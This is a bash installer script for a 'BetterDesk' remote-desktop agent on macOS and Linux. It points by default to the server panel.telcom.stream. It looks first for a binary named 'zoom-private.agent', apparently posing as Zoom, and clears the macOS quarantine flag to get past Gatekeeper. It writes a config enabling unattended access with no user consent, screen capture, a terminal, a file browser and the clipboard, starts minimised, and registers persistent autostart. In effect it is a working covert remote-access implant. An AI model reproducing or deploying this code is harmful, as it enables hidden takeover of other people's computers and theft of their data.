#!/usr/bin/env bash
# BetterDesk client portable installer (macOS / Linux).
#
#   ./install.sh [server-address]
#
# Copies the client into place, seeds agent-config.json with the server
# address, registers autostart and starts the agent. The agent self-registers
# with the server on first launch and shows up in the web console.

set -euo pipefail

SERVER_ADDRESS="${1:-https://panel.telcom.stream}"
BUNDLE_DIR="$(cd "$(dirname "$0")" && pwd)"
OS="$(uname -s)"

case "$OS" in
  Darwin)
    INSTALL_DIR="$HOME/Applications"
    CONFIG_DIR="$HOME/Library/Application Support/BetterDesk/agent"
    ;;
  Linux)
    INSTALL_DIR="$HOME/.local/share/betterdesk"
    CONFIG_DIR="$HOME/.config/betterdesk/agent"
    ;;
  *)
    echo "Unsupported OS: $OS" >&2
    exit 1
    ;;
esac

CLIENT=""
for name in "zoom-private.agent" "betterdesk-agent-client" "BetterDesk Client"; do
  if [ -x "$BUNDLE_DIR/$name" ]; then
    CLIENT="$BUNDLE_DIR/$name"
    break
  fi
done

if [ -z "$CLIENT" ]; then
  APP="$(find "$BUNDLE_DIR" -maxdepth 1 -name '*.app' -type d | head -n 1 || true)"
  if [ -n "$APP" ]; then
    CLIENT="$APP"
  else
    echo "Client binary not found in $BUNDLE_DIR" >&2
    exit 1
  fi
fi

echo "Installing client: $CLIENT"
mkdir -p "$INSTALL_DIR" "$CONFIG_DIR"

if [ -d "$CLIENT" ]; then
  TARGET="$INSTALL_DIR/$(basename "$CLIENT")"
  rm -rf "$TARGET"
  cp -R "$CLIENT" "$TARGET"
  # Unsigned bundles carry the quarantine flag after download — clearing it
  # lets Gatekeeper launch the app without an interactive override.
  xattr -dr com.apple.quarantine "$TARGET" 2>/dev/null || true
  EXECUTABLE="$TARGET/Contents/MacOS/$(basename "$CLIENT" .app)"
  SIDECAR_SRC="$BUNDLE_DIR/betterdesk-agent"
  if [ -f "$SIDECAR_SRC" ]; then
    cp -f "$SIDECAR_SRC" "$TARGET/Contents/MacOS/betterdesk-agent"
    chmod +x "$TARGET/Contents/MacOS/betterdesk-agent"
  fi
else
  TARGET="$INSTALL_DIR/$(basename "$CLIENT")"
  cp -f "$CLIENT" "$TARGET"
  chmod +x "$TARGET"
  EXECUTABLE="$TARGET"
  SIDECAR_SRC="$BUNDLE_DIR/betterdesk-agent"
  if [ -f "$SIDECAR_SRC" ]; then
    cp -f "$SIDECAR_SRC" "$INSTALL_DIR/betterdesk-agent"
    chmod +x "$INSTALL_DIR/betterdesk-agent"
  fi
fi

CONFIG_FILE="$CONFIG_DIR/agent-config.json"
if [ ! -f "$CONFIG_FILE" ]; then
  cat > "$CONFIG_FILE" <<JSON
{
  "server_address": "$SERVER_ADDRESS",
  "api_key": "",
  "cdap_port": 21122,
  "device_id": "",
  "device_name": "",
  "auth_token": "",
  "registered": false,
  "allow_screen_capture": true,
  "access_mode": "unattended",
  "require_consent": false,
  "allow_terminal": true,
  "allow_file_browser": true,
  "allow_clipboard": true,
  "auto_start_sidecar": true,
  "video_codec": "auto",
  "hw_accel": "auto",
  "autostart": true,
  "start_minimized": true,
  "language": "en",
  "unattended_password": "",
  "enforce_tls": true,
  "server_cert_pin": ""
}
JSON
else
  python3 - "$CONFIG_FILE" "$SERVER_ADDRESS" <<'PY' 2>/dev/null || \
  sed -i.bak "s|\"server_address\": *\"[^\"]*\"|\"server_address\": \"$SERVER_ADDRESS\"|" "$CONFIG_FILE"
import json, sys
path, addr = sys.argv[1], sys.argv[2]
with open(path) as fh:
    cfg = json.load(fh)
cfg['server_address'] = addr
with open(path, 'w') as fh:
    json.dump(cfg, fh, indent=2)
PY
fi
echo "Config written: $CONFIG_FILE"

export BETTERDESK_AGENT_CONFIG_DIR="$CONFIG_DIR"

if [ "$OS" = "Darwin" ]; then
  PLIST="$HOME/Library/LaunchAgents/com.betterdesk.agent.plist"
  mkdir -p "$(dirname "$PLIST")"
  cat > "$PLIST" <<PLIST_EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.betterdesk.agent</string>
  <key>ProgramArguments</key>
  <array><string>$EXECUTABLE</string></array>
  <key>EnvironmentVariables</key>
  <dict><key>BETTERDESK_AGENT_CONFIG_DIR</key><string>$CONFIG_DIR</string></dict>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict>
</plist>
PLIST_EOF
  launchctl unload "$PLIST" 2>/dev/null || true
  launchctl load "$PLIST"
  echo "Autostart registered (LaunchAgent)"
else
  UNIT_DIR="$HOME/.config/systemd/user"
  mkdir -p "$UNIT_DIR"
  cat > "$UNIT_DIR/betterdesk-agent.service" <<UNIT_EOF
[Unit]
Description=BetterDesk Agent

[Service]
ExecStart=$EXECUTABLE
Environment=BETTERDESK_AGENT_CONFIG_DIR=$CONFIG_DIR
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
UNIT_EOF
  if command -v systemctl >/dev/null 2>&1; then
    systemctl --user daemon-reload || true
    systemctl --user enable betterdesk-agent.service || true
    systemctl --user restart betterdesk-agent.service || true
    echo "Autostart registered (systemd --user)"
  else
    AUTOSTART_DIR="$HOME/.config/autostart"
    mkdir -p "$AUTOSTART_DIR"
    cat > "$AUTOSTART_DIR/betterdesk-agent.desktop" <<DESKTOP_EOF
[Desktop Entry]
Type=Application
Name=BetterDesk Agent
Exec=$EXECUTABLE
X-GNOME-Autostart-enabled=true
DESKTOP_EOF
    echo "Autostart registered (XDG autostart)"
    nohup "$EXECUTABLE" >/dev/null 2>&1 &
  fi
fi

echo "Done. The device registers itself and appears in the web console."
